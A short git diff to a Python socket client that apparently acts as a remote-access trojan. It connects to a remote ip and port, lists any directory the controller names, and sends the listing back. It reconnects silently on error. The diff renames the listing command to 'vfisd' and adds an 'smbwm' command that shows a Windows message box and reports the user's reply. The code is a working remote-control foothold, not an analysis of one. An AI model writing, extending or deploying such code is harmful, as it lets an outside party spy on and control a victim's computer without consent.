@@ -1,6 +1,7 @@
 import socket
 import os
 import ast
+import ctypes
 
 s = socket.socket()
 
@@ -19,11 +20,27 @@ while True:
         incoming_message = incoming_message.decode()
         incoming_message = ast.literal_eval(incoming_message)
 
-        if(incoming_message[0] == "sfisd"):
+        if(incoming_message[0] == "vfisd"):
             myDir = os.listdir(incoming_message[1])
-            end = str(['sfisd', myDir])
+            
+            end = str(['vfisd', myDir])
             end = end.encode()
+
             s.send(end)
+
+        if(incoming_message[0] == "smbwm"):
+            msgBox = ctypes.windll.user32.MessageBoxW(0, incoming_message[1], incoming_message[2], 4)
+            response = "Null"
+
+            if msgBox == 6: response = "Yes"
+            if msgBox == 7: response = "No"
+            if msgBox == 2: response = "Cancel"
+
+            end = str(['smbwm', response])
+            end = end.encode()
+
+            s.send(end)
+            
     except:
         try:
             s.connect((ip, port))
